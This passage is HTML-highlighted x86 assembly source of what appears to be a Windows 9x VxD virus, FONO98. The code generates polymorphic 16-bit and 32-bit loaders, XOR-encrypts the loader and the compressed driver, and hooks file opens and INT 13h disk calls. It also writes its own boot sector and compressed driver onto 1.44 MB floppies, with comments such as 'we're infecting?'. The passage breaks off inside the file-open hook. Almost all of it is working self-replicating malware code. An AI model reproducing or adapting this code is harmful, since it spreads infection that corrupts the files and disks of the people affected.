         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyBootSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HEAPNOCOPY</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">_HeapReAllocate</span><span class="sc0">               </span><span class="sc1">;set buffer to right size</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyBootBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20000</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorDone</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">maq</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gldr</span><span class="sc0">                             </span><span class="sc1">;generate file poly (16bit)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">Loader</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoaderSize</span><span class="sc0">
  </span><span class="sc5">DosEncriptLoop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DosEncriptLoop</span><span class="sc0">                   </span><span class="sc1">;encript loader</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDCompressedBuffer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDCompressedSize</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">DosEncriptLoop2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DosEncriptLoop2</span><span class="sc0">                  </span><span class="sc1">;zopy and encript vxd</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PEDOSSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HEAPNOCOPY</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">_HeapReAllocate</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40000</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorDone</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PELoaderSize</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">peng</span><span class="sc0">                             </span><span class="sc1">;make our cool PE poly (32bit)</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HEAPNOCOPY</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyPESize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">_HeapReAllocate</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyPEBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">InstallAPIHook</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FONO98_File_System</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;install our file hook</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NextHook</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">InstallV86Hook</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                          </span><span class="sc1">;install our disk hook</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FONO98_Disk_System</span><span class="sc0">
         </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Hook_V86_Int_Chain</span><span class="sc0">
         </span><span class="sc6">clc</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc0">                               </span><span class="sc1">;from here, is a mov al, xx</span><span class="sc0">
  </span><span class="sc5">ErrorDone</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fdh</span><span class="sc0">                               </span><span class="sc1">;from here, is a stc ;)</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">FONO98_Device_Init</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">FONO98_Disk_System</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FloppyInUse</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit13Error</span><span class="sc0">                       </span><span class="sc1">;dont reenter</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FloppyInUse</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;we're infecting?</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">
         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_AX</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_CX</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.Client_DX</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">201h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">                            </span><span class="sc1">;if not floppy boot, exit</span><span class="sc0">
  </span><span class="sc5">InfectBoot</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">SectorBuffer</span><span class="sc0">
         </span><span class="sc5">VxDInt</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc0">                          </span><span class="sc1">;if sector dont start with a</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">                            </span><span class="sc1">;short jump, bail out</span><span class="sc0">
         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;calculate destination of</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1feh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0aa55h</span><span class="sc0">       </span><span class="sc1">;jump(to insert out code)</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.bpb_t_s</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2880</span><span class="sc0">      </span><span class="sc1">;is a valid 1.44 floppy?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.bpb_t_s</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">;steal 36 sectorz</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyBootSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">510</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">                            </span><span class="sc1">;will our code use more space</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyBootBuffer</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;than we have?</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">301h</span><span class="sc0">                         </span><span class="sc1">;write our cool boot sector</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc5">VxDInt</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">312h</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4f01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDCompressedBuffer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">VxDInt</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                            </span><span class="sc1">;write first part of compressed</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">                             </span><span class="sc1">;VXD</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">312h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4f01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VxDCompressedBuffer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc4">*</span><span class="sc2">18</span><span class="sc0">                       </span><span class="sc1">;write the second part of it</span><span class="sc0">
         </span><span class="sc5">VxDInt</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0302h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000fh</span><span class="sc0">                        </span><span class="sc1">;write loader to the end of the</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">BootLoader</span><span class="sc0">          </span><span class="sc1">;root directory</span><span class="sc0">
         </span><span class="sc5">VxDInt</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Exit13</span><span class="sc0">
  </span><span class="sc5">Exit13</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FloppyInUse</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">Exit13Error</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">popad</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">                                   </span><span class="sc1">;service not finished</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">FONO98_Disk_System</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">FONO98_File_System</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">High_Freq</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IFSFN_Open</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitNow</span><span class="sc0">                           </span><span class="sc1">;only hook FileOpenz</span><span class="sc0">
  </span><span class="sc5">WeAreUsingAPI</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ExitNow</span><span class="sc0">                           </span><span class="sc1">;recursive?</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurFile</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">GetPlainName</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pushad</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NoDrive</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"@"</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">;if drive specificated,</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                               </span><span class="sc1">;get it</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">":"</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
  </span><span class="sc5">NoDrive</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">BCS_WANSI</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">255</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">UniToBCSPAth</span><span class="sc0">                  </span><span class="sc1">;make UNICODE a ASCII in our</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                            </span><span class="sc1">;buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc4">+</span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;save attributes</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitCorrect</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc4">+</span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
